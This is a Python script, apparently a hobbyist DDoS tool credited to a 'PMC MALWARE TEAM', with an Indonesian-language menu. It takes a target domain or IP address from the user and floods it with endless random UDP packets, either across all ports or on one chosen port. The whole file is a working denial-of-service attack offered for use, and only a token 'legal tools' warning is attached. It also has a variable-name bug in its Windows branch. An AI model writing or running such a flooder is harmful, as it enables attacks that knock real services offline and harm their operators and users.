# Import.
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet


# Version.
version = "0.5"


# Platform info
uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Bntng Ddos
while True:
    # UI.
    print(" ┏┓  ┏━┓ ┏┓┏ ┏┳┓ ┏┓┏ ┏━┓  \033[36m┏┳┓ ┏┳┓ \033[37m┏━┓ ┏━┓  Version: " + version)       
    print(" ┣┻┓ ┣━┫ ┃┃┃  ┃  ┃┃┃ ┃ ┳   \033[36m┃┃  ┃┃ \033[37m┃ ┃ ┗━┓  ") 
    print(" ┗━┛ ┻ ┻ ┛┗┛  ┻  ┛┗┛ ┗━┛  \033[36m━┻┛ ━┻┛ \033[37m┗━┛ ┗━┛  ")
    print("\033[37m       Author  : Mr./B7")
    print("\033[37m       Github  : https://github.com/Unlimitid-Crak-You")
    print('\033[37m       Warning : For legal Tools in')
    print("\033[92;1m")
    print("\033[33m PILIH SESUAI KEBUTUHAN ANDA !!")
    print('')
    print("\033[31m[\033[37m01\033[31m] \033[36mWebsite Domain\n\033[31m[\033[37m02\033[31m] \033[36mIP Address\n\033[31m[\033[37m03\033[31m] \033[36mAbout\n\033[31m[\033[37m04\033[31m] \033[36mExit")
    print('\033[0m')

    # Input.
    opt = str(input("\n• Input >> \033[33m"))

    # Selection.
    if opt == '01':
        domain = str(input("\n\033[36mMASUKAN DOMAIN TARGET KALIAN !\nDomain: \033[33m"))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '02':
        ip = str(input("\n\033[36mMASUKAN IP TARGET KALIAN !\nIP Address: \033[33m"))
        break

    elif opt == '03':
        print(' ')
        print("\033[32mAuthor   \033[31m: \033[36m./B7 [ PMC MALWARE TEAM ].")
        print("\033[32mGithub   \033[31m:\033[36m https://github.com/Unlimitid-Crak-You.")
        print("\033[32mSocial   \033[31m:\033[36m https://instagram.com/rizal_febriian.")
        print("\033[32mlegit cases.")
        print("\n\033[33mFor more information visit project's site.")
        
        goon = input("\n\n\033[37mPress Enter to continue.")
        os.system(cmd_clear)

    elif opt == '04':
        exit()

    else:
        print('\033[0m[ \033[33mInvaild Choice \033[0m]')
        time.sleep(1)
        os.system(cmd_clear)

# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
port = 2

while 1:
    port_bool = str(input("\nCertain port ? [y/n]: "))

    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)

# Starting working.
os.system(cmd_clear)
print('\033[36;2mPROSES OPEN WAIT...')
print('\033[36;2mINITIALIZING....')
time.sleep(1)
print('STARTING...')
time.sleep(4)

sent = 0

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

elif port_mode == True: # Certain port.
    if port < 2:
        port = 2
        
    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1901

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
    except:
        print('\n\033[31;1mExited\033[0m')